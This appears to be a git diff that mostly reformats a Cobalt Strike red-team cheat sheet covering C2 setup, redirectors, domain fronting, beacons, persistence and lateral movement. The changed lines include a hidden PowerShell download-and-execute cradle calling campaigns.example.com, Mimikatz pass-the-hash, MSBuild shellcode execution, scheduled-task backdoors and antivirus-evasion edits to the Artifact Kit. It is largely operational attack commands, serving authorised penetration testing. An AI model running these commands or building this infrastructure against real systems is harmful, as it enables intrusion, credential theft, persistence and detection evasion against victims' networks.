@@ -2,40 +2,38 @@
 
 > Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.
 
-
 ```powershell
-$ sudo apt-get update
-$ sudo apt-get install openjdk-11-jdk
-$ sudo apt install proxychains socat
-$ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
-$ sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
-$ ./cobaltstrike
-$ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))" 
+sudo apt-get update
+sudo apt-get install openjdk-11-jdk
+sudo apt install proxychains socat
+sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
+sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
+./cobaltstrike
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))"
 ```
 
 ## Summary
 
 * [Infrastructure](#infrastructure)
-    * [Redirectors](#redirectors)
-    * [Domain fronting](#domain-fronting)
-    * [OpSec](#opsec)
+  * [Redirectors](#redirectors)
+  * [Domain fronting](#domain-fronting)
+  * [OpSec](#opsec)
 * [Payloads](#payloads)
-    * [DNS Beacon](#dns-beacon)
-    * [SMB Beacon](#smb-beacon)
-    * [Metasploit compatibility](#metasploit-compatibility)
-    * [Custom Payloads](#custom-payloads)
+  * [DNS Beacon](#dns-beacon)
+  * [SMB Beacon](#smb-beacon)
+  * [Metasploit compatibility](#metasploit-compatibility)
+  * [Custom Payloads](#custom-payloads)
 * [Malleable C2](#malleable-c2)
 * [Files](#files)
 * [Powershell .NET](#powershell-net)
 * [Lateral Movement](#lateral-movement)
 * [VPN & Pivots](#vpn--pivots)
 * [Kits](#kits)
-    * [Elevate Kit](#elevate-kit)
-    * [Persistence Kit](#persistence-kit)
-    * [Resource Kit](#resource-kit)
-    * [Artifact Kit](#artifact-kit)
+  * [Elevate Kit](#elevate-kit)
+  * [Persistence Kit](#persistence-kit)
+  * [Resource Kit](#resource-kit)
+  * [Artifact Kit](#artifact-kit)
 * [References](#references)
-
 
 ## Infrastructure
 
@@ -49,23 +47,24 @@ socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80
 ### Domain Fronting
 
 * New Listener > HTTP Host Header
-* Target Finance & Healthcare domains 
+* Target Finance & Healthcare domains
 
 ### OpSec
 
 **Don't**
+
 * Change default self-signed HTTPS certificate
 * Change default port (50050)
 * 0.0.0.0 DNS response
 * Metasploit compatibility, ask for a payload : `wget -U "Internet Explorer" http://127.0.0.1/vl6D`
 
 **Do**
+
 * Use a redirector (Apache, CDN, ...)
 * Firewall to only accept HTTP/S from the redirectors
 * Firewall 50050 and access via SSH tunnel
 * Edit default HTTP 404 page and Content type: text/plain
 * No staging `set hosts_stage` to `false` in Malleable C2
-
 
 ## Payload
 
@@ -84,8 +83,8 @@ Example of DNS on Digital Ocean:
 
 ```powershell
 NS  example.com                     directs to 10.10.10.10.            86400
-NS  polling.campaigns.example.com   directs to campaigns.example.com.	3600
-A	campaigns.example.com           directs to 10.10.10.10	            3600 
+NS  polling.campaigns.example.com   directs to campaigns.example.com. 3600
+A campaigns.example.com           directs to 10.10.10.10             3600
 ```
 
 ```powershell
@@ -97,14 +96,14 @@ echo "nameserver 8.8.4.4" >>  /etc/resolv.conf
 ```
 
 Configuration:
+
 1. **host**: campaigns.domain.com
 2. **beacon**: polling.campaigns.domain.com
 3. Interact with a beacon, and `sleep 0`
 
-
 ### SMB Beacon
 
-Uses Named Pipes.    
+Uses Named Pipes.
 Connect to an SMB Beacon : `link [host] [pipe]`
 
 ### Metasploit compatibility
@@ -117,10 +116,10 @@ Connect to an SMB Beacon : `link [host] [pipe]`
 
 ### Custom Payloads
 
-https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c
+<https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c>
 
 ```powershell
-* Attacks > Packages > Payload Generator 
+* Attacks > Packages > Payload Generator
 * Attacks > Packages > Scripted Web Delivery (S)
 $ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
 $ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
@@ -129,9 +128,9 @@ $ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\d
 
 ## Malleable C2
 
-* Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles
-* Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2
-* Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles
+* Cobalt Strike - Malleable C2 Profiles <https://github.com/xx0hcd/Malleable-C2-Profiles>
+* Cobalt Strike Malleable C2 Design and Reference Guide <https://github.com/threatexpress/malleable-c2>
+* Malleable-C2-Profiles <https://github.com/rsmudge/Malleable-C2-Profiles>
 
 ```powershell
 set useragent "SOME AGENT"; # GOOD
@@ -216,7 +215,6 @@ http-post {
 }
 ```
 
-
 ## Files
 
 ```powershell
@@ -267,14 +265,14 @@ beacon > execute-assembly /home/audit/Rubeus.exe
 [+] host called home, sent: 318507 bytes
 [+] received output:
 
-   ______        _                      
-  (_____ \      | |                     
-   _____) )_   _| |__  _____ _   _  ___ 
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
   |  __  /| | | |  _ \| ___ | | | |/___)
   | |  \ \| |_| | |_) ) ____| |_| |___ |
   |_|   |_|____/|____/|_____)____/(___/
 
-  v1.4.2 
+  v1.4.2
 ```
 
 ## Lateral Movement
@@ -284,17 +282,17 @@ beacon > execute-assembly /home/audit/Rubeus.exe
 ```powershell
 Beacon Remote Exploits
 ======================
-jump [module] [target] [listener] 
+jump [module] [target] [listener]
 
-    psexec	x86	Use a service to run a Service EXE artifact
-    psexec64	x64	Use a service to run a Service EXE artifact
-    psexec_psh	x86	Use a service to run a PowerShell one-liner
-    winrm	x86	Run a PowerShell script via WinRM
-    winrm64	x64	Run a PowerShell script via WinRM
+    psexec x86 Use a service to run a Service EXE artifact
+    psexec64 x64 Use a service to run a Service EXE artifact
+    psexec_psh x86 Use a service to run a PowerShell one-liner
+    winrm x86 Run a PowerShell script via WinRM
+    winrm64 x64 Run a PowerShell script via WinRM
 
 Beacon Remote Execute Methods
 =============================
-remote-exec [module] [target] [command] 
+remote-exec [module] [target] [command]
 
     Methods                         Description
     -------                         -----------
@@ -305,6 +303,7 @@ remote-exec [module] [target] [command]
 ```
 
 Opsec safe Pass-the-Hash:
+
 1. `mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:"powershell -w hidden"`
 2. `steal_token PID`
 
@@ -312,7 +311,6 @@ Opsec safe Pass-the-Hash:
 
 * Use `link` to connect to SMB Beacon
 * Use `connect` to connect to TCP Beacon
-
 
 ## VPN & Pivots
 
@@ -355,8 +353,9 @@ Beacon Command Elevators
 
 ### Persistence Kit
 
-* https://github.com/0xthirteen/MoveKit
-* https://github.com/fireeye/SharPersist
+* <https://github.com/0xthirteen/MoveKit>
+* <https://github.com/fireeye/SharPersist>
+
     ```powershell
     # List persistences
     SharPersist -t schtaskbackdoor -m list
@@ -383,13 +382,13 @@ Beacon Command Elevators
 
 > Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -> Script Manager, and load the artifact.cna script from that technique's folder.
 
-Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
+Artifact Kit (Cobalt Strike 4.0) - <https://www.youtube.com/watch?v=6mC21kviwG4> :
 
 - `sudo apt-get install mingw-w64`
 - Edit the Artifact code
-    * Change pipename strings
-    * Change `VirtualAlloc` in `patch.c`/`patch.exe`, e.g: HeapAlloc
-    * Change Import
+  * Change pipename strings
+  * Change `VirtualAlloc` in `patch.c`/`patch.exe`, e.g: HeapAlloc
+  * Change Import
 - Build the Artifact
 - Cobalt Strike -> Script Manager > Load .cna
 
@@ -404,7 +403,7 @@ Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
 * [Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation](https://www.youtube.com/watch?v=lzwwVwmG0io)
 * [Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement](https://www.youtube.com/watch?v=QF_6zFLmLn0)
 * [Red Team Ops with Cobalt Strike (9 of 9): Pivoting](https://www.youtube.com/watch?v=sP1HgUu7duU&list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no&index=10&t=0s)
-* [A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 ](https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b)
+* [A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018](https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b)
 * [Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019](https://www.pentestpartners.com/security-blog/cobalt-strike-walkthrough-for-red-teamers/)
 * [TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018](https://holdmybeersecurity.com/2018/11/25/tales-of-a-red-teamer-how-to-setup-a-c2-infrastructure-for-cobalt-strike-ub-2018/)
 * [Cobalt Strike - DNS Beacon](https://www.cobaltstrike.com/help-dns-beacon)
